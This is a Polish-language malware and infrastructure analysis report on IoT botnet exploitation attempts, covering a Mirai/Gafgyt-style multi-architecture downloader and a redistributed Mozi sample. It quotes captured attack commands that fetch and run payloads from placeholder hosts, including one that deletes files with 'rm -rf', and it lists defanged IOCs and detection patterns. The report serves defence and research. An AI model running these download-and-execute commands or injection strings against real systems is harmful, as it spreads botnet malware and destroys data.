# Zautomatyzowane próby eksploatacji związane z botnetami IoT

## Dystrybucja payloadów w stylu Mirai/Gafgyt oraz dalsze rozpowszechnianie znanej próbki Mozi

> **Status:** zakończono analizę infrastruktury, analizę behawioralną opartą na raportach sandboxowych oraz korelację IOC.

## Streszczenie

Niniejsze studium przypadku opisuje zautomatyzowane próby eksploatacji zaobserwowane w lipcu 2026 r. wobec systemu dostępnego z Internetu. Analiza doprowadziła do wyodrębnienia dwóch technicznie odmiennych klastrów dystrybucji malware:

1. prób wykonania poleceń pobierających skrypt powłoki `cumshotnews`, który następnie pobierał pliki ELF dla wielu architektur procesorów;
2. prób command injection pobierających i uruchamiających znany 32-bitowy plik ARM ELF o nazwie `Mozi.a`.

Pierwszy klaster jest zgodny ze współczesnym ekosystemem Mirai/Gafgyt: zautomatyzowana eksploatacja, krótkie skrypty pobierające, wieloarchitekturowy zestaw payloadów oraz pliki podszywające się nazwami pod zwykłe usługi Linuksa. Drugi klaster dystrybuował historyczną próbkę kojarzoną z Mozi.

Materiał dowodowy potwierdza próbę dostarczenia malware oraz aktywną dystrybucję znanego payloadu Mozi. **Nie dowodzi**, że oba klastry były obsługiwane przez tego samego aktora, że eksploatacja zakończyła się powodzeniem ani że pierwotny botnet Mozi i jego operatorzy powrócili.

Wskaźniki w tekście raportu zostały zamaskowane (defanged). Historyczne zrzuty ekranu mogą przedstawiać oryginalne wartości w celach dowodowych. Usunięto dane identyfikujące organizację, dokładne informacje o celu oraz surową telemetrię.

<img width="536" height="395" alt="Ogólny łańcuch dostarczenia malware" src="https://github.com/user-attachments/assets/99a3fceb-f0f2-40d3-8652-288adf47a57f" />

## Zakres i metodyka

W analizie wykorzystano:

- zdekodowane żądania HTTP zebrane z telemetrii bezpieczeństwa;
- kontrolowane pobranie publicznie dostępnych payloadów;
- raporty sandboxowe i wyeksportowane dane IOC;
- hashe kryptograficzne do korelacji między źródłami;
- publiczne opracowania dotyczące Mirai, Gafgyt i Mozi;
- kontrolowane środowisko Ubuntu x86-64 do początkowej próby uruchomienia Mozi.

Repozytorium nie zawiera próbek malware.

### Poziomy pewności

| Poziom | Znaczenie w raporcie |
|---|---|
| Wysoki | Bezpośrednie potwierdzenie przez przechwycone polecenia, pobrane pliki lub zgodne hashe |
| Umiarkowany | Potwierdzenie przez zachowanie w sandboxie i kilka źródeł zewnętrznych, bez niezależnej analizy kodu |
| Niski / hipoteza | Prawdopodobne wyjaśnienie wymagające dodatkowej telemetrii lub analizy kodu |

## Klaster A: wieloarchitekturowa dystrybucja w stylu Mirai/Gafgyt

### Początkowe wykonanie poleceń

Dwa wzorce RCE próbowały uruchomić zasadniczo podobne polecenia powłoki:

- żądanie w stylu ThinkPHP wykorzystujące `call_user_func_array` i `system`;
- żądanie GeoServer WFS wykorzystujące `GetPropertyValue` i `java.lang.Runtime.getRuntime()`.

Poniżej przedstawiono oczyszczoną wersję zdekodowanego polecenia:

```bash
chmod +x /usr/bin/curl
chmod +x /usr/bin/wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q --tries=3 --timeout=10 -O cumshotnews http://[PAYLOAD-HOST]/cumshotnews \
  || curl -fsSL --connect-timeout 10 -o cumshotnews http://[PAYLOAD-HOST]/cumshotnews
chmod 777 cumshotnews
sh cumshotnews
rm -f cumshotnews
```

Polecenie:

1. zapewnia możliwość wykonania `curl` i `wget`;
2. sprawdza kilka katalogów, które często umożliwiają zapis;
3. pobiera skrypt pierwszego etapu;
4. uruchamia go;
5. usuwa downloader.

Użycie kilku dróg eksploatacji przy zachowaniu tej samej logiki dostarczenia jest zgodne z automatycznym, oportunistycznym skanowaniem, a nie ze starannie ukierunkowanym włamaniem.

<img width="590" height="501" alt="Zdekodowane żądanie eksploatacyjne ThinkPHP" src="https://github.com/user-attachments/assets/fb486874-8109-48c1-80d0-9064eab4ee34" />
<img width="2057" height="920" alt="Payload GeoServer zdekodowany w CyberChef" src="https://github.com/user-attachments/assets/05bb7932-db84-4252-bc2e-4890f9ec675b" />
<img width="1279" height="151" alt="Fragment zdekodowanego payloadu GeoServer" src="https://github.com/user-attachments/assets/bf5ff864-d159-4c6a-8207-4ab637039e59" />

### Zachowanie downloadera

Telemetria sandboxowa dla `cumshotnews` wykazała tworzenie payloadów zgodnie ze schematem nazw `ohshit.<architektura>`. Zaobserwowany zestaw obejmował:

- x86 i i686;
- x86-64;
- MIPS i MIPSEL;
- ARM, ARM5, ARM6 i ARM7;
- ARC;
- SPARC;
- M68K;
- SH4;
- PowerPC.

Tak szeroki zakres jest typowy dla dystrybucji malware IoT: jeden skrypt próbuje uruchomić wiele plików, aby co najmniej jeden odpowiadał procesorowi urządzenia ofiary.

<img width="1718" height="860" alt="Downloader payloadów dla wielu architektur" src="https://github.com/user-attachments/assets/6b335be7-a2dc-49ed-834d-98c73e967f64" />

### Infrastruktura hostująca payloady

Publicznie dostępny katalog HTTP zawierał foldery nazwane jak legalne usługi Linuksa i systemów wbudowanych, między innymi:

`chronyd`, `crond`, `dhcpcd`, `dnsmasq`, `dropbear`, `httpd`, `init`, `ntpd`, `sshd`, `syslogd`, `systemd`, `udevd`, `udhcpc` oraz `vsftpd`.

Ta sama infrastruktura udostępniała artefakty nazwane `cumshotnews`, `routereater` i `bachekuni`. Nadawanie malware nazw popularnych demonów może ułatwiać ukrycie go na liście procesów lub w systemie plików podczas pobieżnej inspekcji.

Wniosek ten dotyczy wyłącznie sposobu nazewnictwa. Mechanizmy persistence i podszywanie się procesu wymagają potwierdzenia w telemetrii endpointowej albo analizie kodu.

<img width="648" height="943" alt="Publicznie dostępny katalog z payloadami" src="https://github.com/user-attachments/assets/62053e52-a66e-40bb-9237-f5cdf698122d" />
<img width="2262" height="1136" alt="Publiczne dane o infrastrukturze zaobserwowane w Censys" src="https://github.com/user-attachments/assets/7bddaaca-451b-45d4-84f2-024142de975d" />

### Korelacja hashy

Jeden payload występował pod co najmniej dwiema nazwami:

| SHA-256 | Zaobserwowane nazwy |
|---|---|
| `5c299c0278faf2fb51febdde019a7f24ea147e6c968b688cb05f7cef4d4f76a0` | `ohshit.arm6`, `httpd` |

Pokazuje to, dlaczego nazwy plików nie powinny być traktowane jako stabilne identyfikatory malware. Wiarygodniejszą podstawą korelacji są hashe oraz podobieństwo na poziomie kodu.

### Hashe payloadów dla poszczególnych architektur

Poniższe wartości pochodzą z dostarczonego eksportu IOC z sandboxa:

| Payload | SHA-256 |
|---|---|
| `ohshit.x86` | `8fb4cfabec6fa0b8f0e0d25135e87e88c13c3dce61c1335a89ee2e474a3d1570` |
| `ohshit.mips` | `e7889354c0d2cce6cc0c6a34ec13afd79bf361388e76ed2b3b987e0613d9c6a6` |
| `ohshit.arc` | `c1c1046c507058c0ca6d14bb5369a84a45791d58475ce12fc6995451f0c5eb14` |
| `ohshit.i686` | `c7e7d77602c121ebe2785d8e4068b7d459abe975ad9e3e8471ba28e9783b8dca` |
| `ohshit.x86_64` | `ee44fb0df1cf9740c5779bc5a811e4d1c984365fd5e0482434f58fc1cc54d638` |
| `ohshit.mpsl` | `5f85a860b374bb803aff4cc9e1d928b5ad3d678c0e252b45e7b88d3bed88b152` |
| `ohshit.arm` | `3bc7efeed4bbebc6a515be55736e6726dd3873553b00e70af513f8ab05761422` |
| `ohshit.arm5` | `850847440cf308046af0139b1c74e7059d19e82f591705f772d4568d854c1079` |
| `ohshit.arm6` | `5c299c0278faf2fb51febdde019a7f24ea147e6c968b688cb05f7cef4d4f76a0` |
| `ohshit.arm7` | `517164c29c0e178b1bb4613d3d5ceb552329c9596791624d8277f2dc5ba37c50` |
| `ohshit.spc` | `338b19ba5a4d15cca22d48c02c298064164d9db9654e7473880d12211f3cd185` |
| `ohshit.m68k` | `13f6c8dcecb6677e77680f2b75d82b17fcee135cc00b474bcff5d9c64a06e9bb` |
| `ohshit.sh4` | `f9191fbfcd25b4d0274e7831ae190d888c42be4e3794c4bb3dea7517b704fdee` |
| `ohshit.ppc` | `c0685aa4c68bbecb0bc5a61c3ee46eb9056ae33ded414784761d8ccac48e5bbd` |

Hashe te są obserwacjami historycznymi. Nie gwarantują, że w chwili czytania raportu każdy plik jest nadal dostępny lub klasyfikowany jako złośliwy.

## Klaster B: dalsza dystrybucja znanego payloadu Mozi

### Zaobserwowane polecenie propagacyjne

Oddzielne żądanie miało następującą strukturę:

```text
/shell?cd+/tmp;rm+-rf+*;wget+http://[NODE]:[HIGH-PORT]/Mozi.a;
chmod+777+Mozi.a;/tmp/Mozi.a+jaws
```

Po zdekodowaniu polecenie:

1. przechodzi do `/tmp`;
2. usuwa znajdujące się tam pliki;
3. pobiera `Mozi.a`;
4. nadaje szerokie uprawnienia do wykonania;
5. uruchamia plik z argumentem `jaws`.

Polecenie jest destrukcyjne, ponieważ `rm -rf *` usuwa pliki z bieżącego katalogu tymczasowego. Nie należy go odtwarzać poza jednorazowym, odizolowanym laboratorium.

### Pobrana próbka

| Właściwość | Wartość |
|---|---|
| Nazwa pliku | `Mozi.a` |
| SHA-256 | `12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef` |
| Rozmiar | 307 960 bajtów |
| Format | ELF, 32-bit |
| Architektura | ARM |
| Linkowanie | statyczne |
| Symbole | usunięte (`stripped`) |
| Argument wykonania | `jaws` |
| Ocena rodziny | Mozi; część silników może wskazywać również Mirai |
| Pewność | wysoka dla tożsamości próbki; brak potwierdzenia członkostwa w obecnie aktywnym botnecie |

Próbkę pobrano poprawnie, jednak próba wykonania w środowisku Ubuntu x86-64 zwróciła:

```text
bash: /tmp/Mozi.a: cannot execute binary file: Exec format error
```

Jest to niezgodność architektury, a nie dowód, że próbka jest nieszkodliwa lub uszkodzona. Kernel nie mógł bezpośrednio wykonać programu ARM na procesorze x86-64. Z tego powodu ten konkretny test sandboxowy nie pokazał rzeczywistej aktywności procesowej ani sieciowej próbki.

### Co potwierdza obserwacja

Materiał dowodowy uzasadnia następujący wniosek:

> Znany wcześniej payload ARM kojarzony z Mozi był nadal aktywnie dystrybuowany z hosta internetowego w lipcu 2026 r.

Nie potwierdza on niezależnie:

- dalszej aktywności pierwotnych operatorów Mozi;
- przywrócenia pierwotnej sieci P2P/DHT;
- roli hosta udostępniającego plik jako serwera command and control;
- świadomego udziału właściciela hosta w ataku;
- skutecznego dołączenia urządzenia do aktywnego botnetu po wykonaniu pliku.

Host mógł być przejętym węzłem propagacyjnym, pozostałością wcześniejszej infekcji, infrastrukturą innego aktora ponownie wykorzystującego binarny plik albo systemem badawczym. Pierwsze wyjaśnienie jest zgodne z zachowaniem, ale pozostaje oceną, a nie potwierdzoną atrybucją.

### Dlaczego ten sam plik może być oznaczany jako Mozi lub Mirai

Mozi nie powstało w izolacji. Badania 360 Netlab wykazały związki kodu i funkcji z wcześniejszym malware IoT, w tym Gafgyt i Mirai. Produkty bezpieczeństwa mogą więc nadawać nakładające się etykiety rodzin na podstawie wspólnego kodu, działania skanera, funkcji DDoS, ciągów znaków lub ogólnych sygnatur ELF.

Dlatego raport używa określenia:

> **Payload ARM kojarzony z Mozi, z nakładającymi się detekcjami związanymi z Mirai**

zamiast uznawać pojedynczą etykietę antywirusową za rozstrzygającą atrybucję.

## Ocena relacji między klastrami

| Cecha | Klaster A | Klaster B |
|---|---|---|
| Główny artefakt | `cumshotnews`, `ohshit.*` | `Mozi.a` |
| Dostarczenie | RCE, następnie downloader powłoki | command injection przez `/shell` |
| Architektury | szeroki zestaw wieloarchitekturowy | pobrana próbka ARM |
| Model hostowania | centralne repozytoria HTTP | host na losowym wysokim porcie TCP |
| Ocena rodziny | ekosystem w stylu Mirai/Gafgyt | znany payload kojarzony z Mozi |
| Bezpośredni związek | nieustalony | nieustalony |

Oba klastry były skierowane przeciw urządzeniom linuksowym i wbudowanym, ale podobieństwo klasy celów i użytych narzędzi powłoki nie wystarcza do przypisania ich do jednej kampanii. Uzasadniony wniosek mówi o dwóch wzorcach dostarczania malware IoT zaobserwowanych w ramach tego samego dochodzenia.

## Możliwości detekcji

### Telemetria sieciowa i webowa

Należy priorytetyzować kombinacje zachowań, a nie pojedyncze ciągi:

- `call_user_func_array` razem z `system`;
- GeoServer `GetPropertyValue` razem z `Runtime.getRuntime`;
- `/shell?cd+/tmp`, po którym występuje `wget` lub `curl`;
- żądania do `/Mozi.a`;
- argument `jaws` w pobliżu utworzenia lub wykonania `Mozi.a`;
- pobrania nazwane `cumshotnews`, `routereater` lub `ohshit.*`;
- seryjne pobieranie plików ELF z przyrostkami architektur;
- wychodzący ruch HTTP do wysokich, niestandardowych portów TCP bezpośrednio po próbie exploita.

### Telemetria endpointowa

Wysoką wartość detekcyjną mają sekwencje:

```text
serwer WWW -> sh/bash -> wget/curl -> chmod -> wykonanie ELF
```

oraz:

- utworzenie ELF w `/tmp`, `/var/tmp`, `/var/run`, `/dev/shm` lub `/mnt`;
- uruchomienie `/bin/sh`, `bash`, `wget`, `curl` lub `chmod` przez usługę webową;
- usunięcie nowo utworzonego ELF krótko po wykonaniu;
- uruchamianie plików o nazwach `sshd`, `httpd`, `udevd` lub `dnsmasq` z nietypowych ścieżek;
- próba uruchomienia wielu payloadów dla różnych architektur przez jeden proces.

### Działania ochronne

- aktualizować publicznie dostępne aplikacje i urządzenia, w tym niewspierane urządzenia IoT;
- ograniczać dostęp do interfejsów administracyjnych z Internetu;
- uniemożliwić kontom usług webowych zapis i wykonanie plików w katalogach tymczasowych;
- stosować kontrolę ruchu wychodzącego w sieciach urządzeń wbudowanych i zarządzających;
- alarmować o uruchamianiu powłok lub narzędzi pobierających przez procesy webowe;
- segmentować IoT od sieci użytkowników, serwerów i zarządzania;
- zmieniać domyślne dane logowania i wyłączać nieużywane usługi Telnet/SSH;
- przechowywać telemetrię HTTP, DNS, procesów i plików wystarczająco długo do odtworzenia całego łańcucha.

## Wskaźniki kompromitacji

### Wskaźniki sieciowe

| Wskaźnik | Zaobserwowana rola |
|---|---|
| `192.142.28[.]77` | hostowanie pierwszego etapu `cumshotnews` |
| `166.0.192[.]57` | hostowanie `cumshotnews` i payloadów wieloarchitekturowych |
| `cremin.tropixa[.]online` | hostowanie `routereater` zaobserwowane w sandboxie |
| `blanda.tropixa[.]online` | repozytorium `httpd` zaobserwowane w sandboxie |
| `www.tropixa[.]online` | wielokatalogowe repozytorium payloadów |
| `www.bluekp[.]com` | wielokatalogowe repozytorium payloadów |
| `59.53.122[.]214:34269` | host udostępniający zaobserwowaną próbkę `Mozi.a` |

Wskaźniki infrastruktury są zależne od czasu i mogą później zostać przypisane innym podmiotom, oczyszczone albo używane legalnie. Przed blokowaniem należy je zweryfikować; tam, gdzie to możliwe, lepiej stosować detekcje behawioralne.

### Najważniejsze wskaźniki plikowe

| Artefakt | SHA-256 |
|---|---|
| `Mozi.a` | `12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef` |
| `ohshit.arm6` / `httpd` | `5c299c0278faf2fb51febdde019a7f24ea147e6c968b688cb05f7cef4d4f76a0` |

## Analiza behawioralna oparta na sandboxach

Nie przeprowadzono niezależnego reverse engineeringu plików malware. Wnioski behawioralne opierają się na telemetrii sandboxowej, eksportach IOC, korelacji hashy kryptograficznych oraz publicznie dostępnych badaniach zagrożeń.

Podejście to wystarczyło do odtworzenia łańcucha dostarczenia i udokumentowania obserwowalnego zachowania, ale nie zapewnia takiego poziomu pewności jak ręczna analiza kodu.

### Materiał z raportów sandboxowych

| Kategoria | Obserwacja | Ocena |
|---|---|---|
| Procesy i polecenia | `wget`, `curl`, `chmod` i powłoka służyły do pobrania oraz uruchomienia payloadów | bezpośrednio zaobserwowane dostarczenie |
| Utworzone pliki | `cumshotnews` utworzył wiele plików `ohshit.<architektura>` | wieloarchitekturowa dystrybucja malware IoT |
| Korelacja plików | ten sam SHA-256 wystąpił jako `ohshit.arm6` i `httpd` | nazwy były zmieniane i nie stanowiły wiarygodnego identyfikatora |
| Aktywność sieciowa | payloady pobierano z publicznych repozytoriów HTTP i niestandardowych portów | aktywna infrastruktura hostująca lub propagująca malware |
| Próba wykonania Mozi | pobrano `Mozi.a` i uruchomiono z argumentem `jaws` | bezpośrednio zaobserwowane polecenie propagacyjne |
| Wynik wykonania | system zwrócił `Exec format error` | payload ARM nie mógł wykonać się w środowisku x86-64 |
| Klasyfikacja zewnętrzna | publiczne usługi powiązały hash z Mozi i nakładającymi się detekcjami Mirai | wsparcie identyfikacji rodziny, nie samodzielny dowód atrybucyjny |

### Zasady interpretacji

W analizie zachowano następujące rozróżnienia:

- pobranie pliku nie dowodzi jego skutecznego wykonania;
- etykieta rodziny nadana przez sandbox nie dowodzi samodzielnie atrybucji;
- brak zachowania może wynikać z ograniczeń sandboxa, a nie z nieaktywnej funkcji malware;
- źródłowe adresy IP mogą należeć do przejętych węzłów propagacyjnych;
- historyczne malware może być nadal rozpowszechniane przez niezależnych operatorów;
- podobne zachowanie dwóch klastrów nie dowodzi wspólnego operatora.

Raport skupia się więc na zachowaniu bezpośrednio widocznym w wynikach sandboxowych i oddziela obserwacje od ocen opartych na badaniach zewnętrznych.

## Ograniczenia

- Nie wykonano niezależnego reverse engineeringu plików malware.
- Początkowa próba dynamiczna używała niezgodnego środowiska x86-64.
- Widoczność sandboxa zależała od systemu operacyjnego, architektury, czasu wykonania i symulowanego środowiska sieciowego.
- Werdykty i nazwy rodzin z publicznych sandboxów są materiałem pomocniczym, nie zamiennikiem ręcznej analizy kodu.
- Zachowań opisanych w ogólnych badaniach Mozi lub Mirai nie przypisywano tym konkretnym próbkom, jeżeli nie były widoczne w dostarczonych raportach.
- W publicznym zbiorze danych nie potwierdzono skutecznej eksploatacji pierwotnego celu.
- Źródłowe adresy IP mogą należeć do przejętych urządzeń, a nie operatorów.
- Otwarte katalogi i publiczne raporty są nietrwałe i mogą zniknąć.
- Eksporty IOC JSON zawierały niepowiązany ruch przeglądarki; zachowano wyłącznie artefakty skorelowane z analizowanym łańcuchem.
- Brak dowodów łączących klaster A i klaster B z tym samym operatorem.

## Wnioski

Dochodzenie ujawniło dwa aktywne wzorce dystrybucji malware IoT. Pierwszy wykorzystywał RCE w aplikacjach i krótki skrypt powłoki do rozsyłania plików Linux ELF dla wielu architektur procesorów. Drugi dystrybuował znaną próbkę ARM kojarzoną z Mozi z hosta używającego wysokiego portu TCP.

Obserwacja dotycząca Mozi jest istotna, ponieważ payload zgłoszony po raz pierwszy wiele lat wcześniej nadal można było pobrać w 2026 r. Najbezpieczniejszą interpretacją jest dalsza dystrybucja lub ponowne wykorzystanie historycznego malware Mozi, a nie dowód powrotu pierwotnej operacji.

Studium należy zatem traktować jako analizę infrastruktury dystrybucyjnej, zachowania obserwowalnego w sandboxach i relacji między IOC, a nie jako pełny raport z reverse engineeringu.

## Źródła

### Analizy dotyczące opisywanego przypadku

- [ANY.RUN — próba wykonania pobranej próbki Mozi](https://any.run/report/4ae63def9b6b7aec45dd8221d5a3b933af7d55d2008518df438796f0d78b9e65/7f2ae3b1-8a3d-4031-b77b-4ab8421c2880)
- [VirusTotal — SHA-256 próbki Mozi](https://www.virustotal.com/gui/file/12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef)
- [MalwareBazaar — rekord próbki Mozi](https://bazaar.abuse.ch/sample/12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef/)
- [ANY.RUN — raport wieloarchitekturowego payloadu nr 1](https://any.run/report/9d318f174b34f19a350fb6d3be49c71ba4925b6ca078a4cbaa483b80cb51eff3/d045ec65-e493-43f3-b87c-793f47ec83c7)
- [ANY.RUN — raport wieloarchitekturowego payloadu nr 2](https://any.run/report/888503847dde82d662d053eb608dc58fbccf7f4f04e7aed2af69db7e51baf450/d886a0f5-e354-42d5-9104-3cfc43e02d5f)
- [ANY.RUN — raport wieloarchitekturowego payloadu nr 3](https://any.run/report/50b01d33542e9a7b7ca055a5c9b3fc6eec6a51d2f854180d46df6d6f09f58bcd/9b49973d-09ee-4848-94de-dc21b89a6655)

### Tło techniczne

- [360 Netlab — Mozi, Another Botnet Using DHT](https://blog.netlab.360.com/mozi-another-botnet-using-dht/)
- [Elastic Security Labs — Collecting and operationalizing threat data from the Mozi botnet](https://www.elastic.co/security-labs/collecting-and-operationalizing-threat-data-from-the-mozi-botnet)
- [ESET Research — Who killed Mozi?](https://www.welivesecurity.com/en/eset-research/who-killed-mozi-finally-putting-the-iot-zombie-botnet-in-its-grave/)
- [Akamai SIRT — Mirai exploitation of GeoVision IoT devices](https://www.akamai.com/blog/security-research/active-exploitation-mirai-geovision-iot-botnet)
- [Akamai SIRT — Mirai spreads through a Wazuh vulnerability](https://www.akamai.com/blog/security-research/botnets-flaw-mirai-spreads-through-wazuh-vulnerability)

---
## Informacja
Niniejsza publikacja została przygotowana w celach edukacyjnych, badawczych oraz rozwoju zawodowego. Przedstawia obserwacje techniczne, zastosowane metody i wnioski oparte na materiałach dostępnych w momencie prowadzenia analizy.

Publikacja nie zawiera danych osobowych, danych uwierzytelniających, prywatnej korespondencji, wewnętrznej telemetrii, informacji poufnych ani zastrzeżonych, a także szczegółów infrastruktury charakterystycznych dla konkretnej organizacji. Wszelkie wrażliwe informacje kontekstowe zostały pominięte lub zanonimizowane. Publiczne wskaźniki techniczne zostały uwzględnione wyłącznie tam, gdzie były istotne dla analizy, oraz odpowiednio zdezaktywowane.

O ile nie wskazano wyraźnie inaczej, publikacja nie identyfikuje źródła, właściciela, podmiotu, którego dotyczy analiza, ani okoliczności, w których analizowany materiał został pozyskany lub zaobserwowany. Przedstawione ustalenia odzwierciedlają dostępne dowody oraz zakres przyjęty dla danej analizy.
